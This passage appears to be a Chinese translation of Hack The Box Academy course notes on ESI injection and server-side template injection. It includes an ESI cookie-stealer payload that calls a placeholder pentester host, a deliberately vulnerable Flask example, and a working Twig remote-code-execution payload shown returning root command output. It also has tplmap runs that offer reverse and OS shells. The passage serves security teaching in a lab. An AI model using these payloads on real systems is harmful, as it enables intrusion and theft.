<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">// Basic detection</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:</span> <span class="attr">include</span> <span class="attr">src</span>=<span class="string">http://</span>&lt;<span class="attr">PENTESTER</span> <span class="attr">IP</span>&gt;</span>&gt;</span><br><span class="line"></span><br><span class="line">// XSS Exploitation Example</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:</span> <span class="attr">include</span> <span class="attr">src</span>=<span class="string">http://</span>&lt;<span class="attr">PENTESTER</span> <span class="attr">IP</span>&gt;</span>/<span class="tag">&lt;<span class="name">XSSPAYLOAD.html</span>&gt;</span>&gt;</span><br><span class="line"></span><br><span class="line">// Cookie Stealer (bypass httpOnly flag)</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:</span> <span class="attr">include</span> <span class="attr">src</span>=<span class="string">http://</span>&lt;<span class="attr">PENTESTER</span> <span class="attr">IP</span>&gt;</span>/?cookie_stealer.php?=$(HTTP_COOKIE)&gt;</span><br><span class="line"></span><br><span class="line">// Introduce private local files (Not LFI per se)</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">"supersecret.txt"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Valid for Akamai, sends debug information in the response</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:debug</span>/&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>在某些情况下，当处理ESI指令的应用程序支持XML（一种用于转换XML文件的动态语言）时，我们可以实现远程代码执行。在这种情况下，我们可以将<code>dca=xslt</code>传递给payload。所选的XML文件将被处理，可能会执行XML外部实体注入攻击（XXE），但有一些限制。</p>
<p><a target="_blank" rel="noopener" href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/">GoSecure</a>创建了一个表，以帮助我们了解可能的攻击，我们可以根据支持的功能，针对不同的具有ESI功能的软件进行尝试。让我们首先对下表的列名进行一些解释：</p>
<ul>
<li>包括：支持<code>&lt;esi:includes&gt;</code>指令</li>
<li>Vars：支持<code>&lt;esi:vars&gt;</code>指令。用于绕过XSS过滤器</li>
<li>Cookie：ESI引擎可访问文档Cookie</li>
<li>需要上游标头：除非上游应用程序提供标头，否则代理应用程序将不会处理ESI语句</li>
<li>主机允许列表：在这种情况下，ESI包含只能从允许的服务器主机，使SSRF，例如，只能对这些主机</li>
</ul>
<table>
<thead>
<tr>
<th><strong>Software</strong></th>
<th><strong>Includes</strong></th>
<th><strong>Vars</strong></th>
<th><strong>Cookies</strong></th>
<th><strong>Upstream Headers Required</strong></th>
<th><strong>Host Whitelist</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Squid3</td>
<td>Yes</td>
<td>Yes</td>
<td>Yes是的</td>
<td>Yes</td>
<td>No</td>
</tr>
<tr>
<td>Varnish Cache</td>
<td>Yes</td>
<td>No</td>
<td>No没有</td>
<td>Yes</td>
<td>Yes</td>
</tr>
<tr>
<td>Fastly</td>
<td>Yes</td>
<td>No</td>
<td>No没有</td>
<td>No</td>
<td>Yes</td>
</tr>
<tr>
<td>Akamai ESI Test Server (ETS)</td>
<td>Yes</td>
<td>Yes</td>
<td>Yes是的</td>
<td>No</td>
<td>No</td>
</tr>
<tr>
<td>NodeJS esi</td>
<td>Yes</td>
<td>Yes</td>
<td>Yes是的</td>
<td>No</td>
<td>No</td>
</tr>
<tr>
<td>NodeJS nodesi</td>
<td>Yes</td>
<td>No</td>
<td>No没有</td>
<td>No</td>
<td>Optional</td>
</tr>
</tbody></table>
<h1 id="Server-Side-Template-Injections"><a href="#Server-Side-Template-Injections" class="headerlink" title="Server-Side Template Injections"></a>Server-Side Template Injections</h1><p>模板引擎从模板文档中读取标记化的字符串，并在输出文档中生成具有实际值的呈现字符串。模板通常被Web开发人员用作创建动态网站内容的中间格式。服务器端模板注入（<code>SSTI</code>）本质上是在模板中注入恶意模板指令，利用模板引擎将用户输入与给定模板不安全地混合在一起。</p>
<p>下面你会发现一些应用程序，你可以在本地运行，以更好地理解模板。如果你不能做到这一点，不要担心。以下各节介绍了使用模板的各种应用程序的练习。</p>
<p>现在让我们考虑以下文件：</p>
<p>app.py</p>
<p>Code:</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">"./"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	title = <span class="string">"Index Page"</span></span><br><span class="line">	content = <span class="string">"Some content"</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, title=title, content=content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	app.run(host=<span class="string">"127.0.0.1"</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>index.html</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>{{title}}<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>{{content}}<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>当我们访问网站时，我们将收到一个HTML页面，其中包含模板页面上双括号内的<code>title</code>和<code>content</code>变量的值。非常简单，正如我们所看到的，用户对变量没有任何控制权。但是，当用户输入没有经过任何验证就进入模板时，会发生什么呢？</p>
<p>app.py</p>
<p>Code: </p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">"./"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/"</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	title = <span class="string">"Index Page"</span></span><br><span class="line">	content = <span class="string">"Some content"</span></span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, title=title, content=content)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">"/hello"</span>, methods=[<span class="string">'GET'</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">	name = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">	<span class="keyword">if</span> name == <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> redirect(<span class="string">f'<span class="subst">{url_for(<span class="string">"hello"</span>)}</span>?name=guest'</span>)</span><br><span class="line">	htmldoc = <span class="string">f"""</span></span><br><span class="line"><span class="string">	&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">	&lt;h1&gt;Hello&lt;/h1&gt;</span></span><br><span class="line"><span class="string">	&lt;a&gt;Nice to see you <span class="subst">{name}</span>&lt;/a&gt;</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">	&lt;/html&gt;</span></span><br><span class="line"><span class="string">	"""</span></span><br><span class="line">	<span class="keyword">return</span> render_template_string(htmldoc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	app.run(host=<span class="string">"127.0.0.1"</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>在这种情况下，我们可以直接注入一个模板表达式，服务器将评估它。这是一个安全问题，可能会导致目标应用程序上的远程代码执行，正如我们将在下面的部分中看到的那样。</p>
<p>cURL - Interacting with the Target</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 79</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.9.7</span><br><span class="line">Date: Mon, 25 Oct 2021 00:12:40 GMT</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;Hello&lt;/h1&gt;</span><br><span class="line">	&lt;a&gt;Nice to see you 49&lt;/a&gt; # &lt;-- Expresion evaluated</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">	&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<h2 id="SSTI标识"><a href="#SSTI标识" class="headerlink" title="SSTI标识"></a>SSTI标识</h2><p>我们可以通过在我们控制的输入中注入不同的标记来检测SSTI漏洞，以查看它们是否在响应中进行了评估。我们不一定需要看到注入的数据反映在我们收到的响应中。有时它只是在不同的页面上进行评估（盲）。</p>
<p>检测进样的最简单方法是在花括号中提供数学表达式，例如：</p>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line">{7*7}</span><br><span class="line">${7*7}</span><br><span class="line">#{7*7}</span><br><span class="line">%{7*7}</span><br><span class="line">{{7*7}}</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>

<p>当注入这些有效负载时，我们将在响应中查找“49”，以确定发生了服务器端评估。</p>
<p>识别SSTI最困难的方法是通过注入模板表达式中使用的特殊字符组合来模糊模板。这些字符包括<code>${{&lt;%[%'"}}%\</code>。如果导致异常，这意味着我们可以控制服务器根据模板表达式解释的内容。</p>
<p>我们可以使用<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">Tplmap</a>或J2EE Scan（Burp Pro）等工具来自动测试SSTI漏洞或创建有效负载列表以用于Burp Intruder或ZAP。</p>
<p>下面来自<a target="_blank" rel="noopener" href="https://portswigger.net/research/server-side-template-injection">PortsSwigger</a>的图表可以帮助我们确定我们是否正在处理SSTI漏洞，并确定底层模板引擎。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/ssti_diagram.png" alt="image"></p>
<p>除了上面的图表，我们可以尝试以下方法来识别我们正在处理的技术：</p>
<ul>
<li>检查技术名称的详细错误。有时候，仅仅复制谷歌搜索中的错误就可以为我们提供关于所使用的底层技术的直接答案</li>
<li>检查扩展。例如，.jsp扩展名与Java相关联。在处理Java时，我们可能面临的是表达式语言/OGNL注入漏洞，而不是传统的SSTI</li>
<li>发送带有未闭合花括号的表达式，以查看是否生成详细错误。不要在生产系统上尝试这种方法，因为可能会导致Web服务器崩溃。</li>
</ul>
<h2 id="SSTI-Exploitation-Example-1"><a href="#SSTI-Exploitation-Example-1" class="headerlink" title="SSTI Exploitation Example 1"></a>SSTI Exploitation Example 1</h2><p>假设我们正在测试一个面向互联网的应用程序（目标可以在本节的最后生成）。我们的重点将是确定应用程序是否容易受到服务器端模板注入的攻击。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig1.png" alt="image"></p>
<p>让我们在输入字段中提交花括号中的数学表达式，例如在<code>SSTI Identification</code>部分中提到的那些，从<code>{7*7}</code>开始。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig2.png" alt="image"></p>
<p>看起来应用程序没有评估提交的表达式。让我们继续另一个表达式，这次是<code>${7*7}</code>。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig3.png" alt="image"></p>
<p>看起来应用程序也没有计算这个表达式。<code>{{7*7}}</code>怎么样？</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig6.png" alt="image"></p>
<p>幸运的是，这一次，应用程序评估了我们提交的最新数学表达式，并返回了结果49。看起来我们可能正在处理一个SSTI漏洞！</p>
<p>如前所述，在处理SSTI漏洞时，我们需要做的第一件事是识别应用程序正在使用的模板引擎。让我们使用PortSwigger的图表来帮助我们（如前一节所示）。我们已经知道<code>{{7*7}}</code>表达式被成功地求值了。图中建议尝试的下一个表达式是<code>{{7*'7'}}</code>。让我们尝试一下，看看应用程序如何响应。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig_.png" alt="image"></p>
<p>应用程序也成功地计算了此表达式。根据PortSwigger的图表，我们正在处理Jinja 2或Twig模板引擎。</p>
<p>我们可以使用模板引擎特定的有效载荷来确定正在使用的是哪两个。让我们尝试下面的Twig特定的一个：</p>
<p>Code: </p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">{{_self.env.<span class="title function_ invoke__">display</span>(<span class="string">"TEST"</span>)}}</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig7.png" alt="image"></p>
<p>成功评估了Twig特定的有效载荷。一个Twig模板引擎正在后端使用。有关模板引擎特定有效负载的详细列表，请参阅以下资源：</p>
<ul>
<li>[PayloadsAllTheThings - Template Injection<br>PayloadsAllTheThings -模板注入](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection)</li>
<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks - SSTI (Server Side Template Injection)<br>HackTricks - SSTI（服务器端模板注入）</a></li>
</ul>
<p>我们可以通过<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a>自动执行模板引擎识别过程，如下所示。如果您没有注意到，用户的输入是通过<code>name</code>参数和POST请求提交的（因此是<code>-d</code>中的<code>tplmap</code>参数）。</p>
<h4 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ git clone https://github.com/epinna/tplmap.git</span><br><span class="line">mikannse7@htb[/htb]$ cd tplmap</span><br><span class="line">mikannse7@htb[/htb]$ pip install virtualenv</span><br><span class="line">mikannse7@htb[/htb]$ virtualenv -p python2 venv</span><br><span class="line">mikannse7@htb[/htb]$ source venv/bin/activate</span><br><span class="line">mikannse7@htb[/htb]$ pip install -r requirements.txt</span><br><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;' -d name=john</span><br><span class="line"></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if POST parameter 'name' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Twig plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  POST parameter: name</span><br><span class="line">  Engine: Twig</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: Linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, php code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell				Run shell on the target</span><br><span class="line">    --os-cmd				Execute shell commands</span><br><span class="line">    --bind-shell PORT			Connect to a shell bind to a target port</span><br><span class="line">    --reverse-shell HOST PORT	Send a shell back to the attacker's port</span><br><span class="line">    --upload LOCAL REMOTE	Upload files to the server</span><br><span class="line">    --download REMOTE LOCAL	Download remote files</span><br></pre></td></tr></tbody></table></figure>

<p>下一步是在目标服务器上获得远程代码执行。在移动有效负载部分之前，应该提到Twig有一个变量<code>_self</code>，简单来说，它使一些内部API公开。这个<code>_self</code>对象已经被记录下来了，所以我们不需要强制使用任何变量名（在接下来的SSTI利用示例中会有更多内容）。回到远程代码执行部分，我们可以使用<code>getFilter</code>函数，因为它允许通过以下过程执行用户定义的函数：</p>
<ul>
<li>通过<code>registerUndefinedFilterCallback</code>将函数注册为过滤器回调</li>
<li>调用<code>_self.env.getFilter()</code>来执行我们刚刚注册的函数</li>
</ul>
<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>Code: </p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">{{_self.env.<span class="title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="string">"system"</span>)}}{{_self.env.<span class="title function_ invoke__">getFilter</span>(<span class="string">"id;uname -a;hostname"</span>)}}</span><br></pre></td></tr></tbody></table></figure>

<p>这次让我们使用cURL提交有效负载。</p>
<h4 id="cURL-Interacting-with-the-Target-cURL-与目标交互"><a href="#cURL-Interacting-with-the-Target-cURL-与目标交互" class="headerlink" title="cURL - Interacting with the Target cURL -与目标交互"></a>cURL - Interacting with the Target cURL -与目标交互</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"</span><br><span class="line">"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;link rel="stylesheet" type="text/css" href="css/default.css" media="screen"/&gt;</span><br><span class="line">  &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">  &lt;div class="main"&gt;</span><br><span class="line">    &lt;div class="header"&gt;</span><br><span class="line">      &lt;div class="title"&gt;</span><br><span class="line">        &lt;h1&gt;I'm here to say hello&lt;/h1&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="content"&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;a&gt;</span><br><span class="line">    Who are you?</span><br><span class="line">    &lt;form method='post' action=''&gt;</span><br><span class="line">        &lt;div class="form-group"&gt; </span><br><span class="line">            &lt;input placeholder="Name" name="name" size=70&gt;&lt;/input&gt; &lt;button class="btn btn-default" type="submit" name='submit'&gt;Send&lt;/button&gt;</span><br><span class="line">       &lt;/div&gt; </span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">Hello uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux</span><br><span class="line">serversideattackssstitwig-60784-78bd58b5b-pmvvv</span><br><span class="line">serversideattackssstitwig-60784-78bd58b5b-pmvvv!&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;    </span><br><span class="line">        &lt;div class="clearer"&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="footer"&gt;Break me!&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>正如我们在上面的输出/响应中所看到的，提交的有效负载得到了评估，并且指定的命令（<code>id</code>、<code>uname -a</code>和<code>hostname</code>）被成功执行。</p>
<p>同样，我们可以通过<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a>自动执行模板引擎利用过程，如下所示。</p>
<h4 id="tplmap-py-OS-Shell"><a href="#tplmap-py-OS-Shell" class="headerlink" title="tplmap.py - OS Shell"></a>tplmap.py - OS Shell</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ ./tplmap.py -u 'http://&lt;TARGET IP&gt;:&lt;PORT&gt;' -d name=john --os-shell</span><br><span class="line"></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing if POST parameter 'name' is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag '*'</span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag '${*}'</span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag 'str(*)'</span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Jinja2 plugin is testing blind injection</span><br><span class="line">[+] Twig plugin is testing rendering with tag '{{*}}'</span><br><span class="line">[+] Twig plugin has confirmed injection with tag '{{*}}'</span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  POST parameter: name</span><br><span class="line">  Engine: Twig</span><br><span class="line">  Injection: {{*}}</span><br><span class="line">  Context: text</span><br><span class="line">  OS: Linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell command execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File read: ok</span><br><span class="line">   Code evaluation: ok, php code</span><br><span class="line"></span><br><span class="line">[+] Run commands on the operating system.</span><br><span class="line"></span><br><span class="line">Linux $ </span><br></pre></td></tr></tbody></table></figure>

<p>我们现在可以通过为我们建立的shell <code>tplmap</code>执行我们选择的任何命令！</p>
<p>现在，继续本节的练习，通过自己制作有效载荷或通过在<code>tplmap</code>的帮助下获得的shell来完成目标。</p>
<p><strong>注意：</strong>当我们注意到我们提交的数学表达式被计算时，应用程序也可能容易受到XSS的攻击。</p>
<p>让我们通过将大括号内的XSS有效负载提交给本节的练习目标来测试上面的语句。这样做的结果可以在下面的图片中看到。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/twig8.png" alt="image"></p>
<h2 id="SSTI-Exploitation-Example-2"><a href="#SSTI-Exploitation-Example-2" class="headerlink" title="SSTI Exploitation Example 2"></a>SSTI Exploitation Example 2</h2><p>假设我们的任务是对另一个面向互联网的应用程序进行渗透测试。我们的重点将是确定应用程序是否容易受到服务器端模板注入的攻击。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/tornado1.png" alt="image"></p>
<p>如果您使用Firefox的Web开发工具（<code>[Ctrl]</code>+<code>[Shift]</code>+<code>[I]</code>）检查应用程序的流量，您会注意到用户输入在名为<code>email</code>的参数中提交，并通过POST请求提交给<code>http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</code></p>
<p>让我们将大括号中的数学表达式提交到输入字段，例如在<code>SSTI Identification</code>部分中提到的那些，从<code>${7*7}</code>开始，正如PortSwigger的图表所示。</p>
<h4 id="cURL-Interacting-with-the-Target-7"><a href="#cURL-Interacting-with-the-Target-7" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email=${7*7}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 style="text-align: center;"&gt;&lt;em&gt;Email ${7*7} has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>看起来应用程序没有评估提交的表达式。</p>
<h4 id="cURL-Interacting-with-the-Target-8"><a href="#cURL-Interacting-with-the-Target-8" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{7*7}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 style="text-align: center;"&gt;&lt;em&gt;Email 49 has been subscribed. You&amp;#39;ll hear from us soon!&lt;/em&gt;&lt;/h3&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>应用程序这次评估了提交的表达式。按照PortSwigger的图表，让我们继续识别底层模板引擎。</p>
<h4 id="cURL-Interacting-with-the-Target-9"><a href="#cURL-Interacting-with-the-Target-9" class="headerlink" title="cURL - Interacting with the Target"></a>cURL - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -X POST -d 'email={{7*'7'}}' http://&lt;TARGET IP&gt;:&lt;PORT&gt;/jointheteam</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">form {</span><br><span class="line">margin: 0 auto;</span><br><span class="line">width: 200;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 style="text-align: center;"&gt;~ Damn Hackers ~&lt;/h1&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;Gentlemen, we can rebuild it &lt;br /&gt;We have the technology &lt;br /&gt;We have the capability to make the worlds first bionic website&lt;br /&gt;Better than it was before &lt;br /&gt;Better, Stronger, Faster.&lt;/h2&gt;</span><br><span class="line">&lt;h2 style="text-align: center;"&gt;&lt;em&gt;Great!&lt;/em&gt;&lt;/h2&gt;</span><br><span class="line">&lt;h3 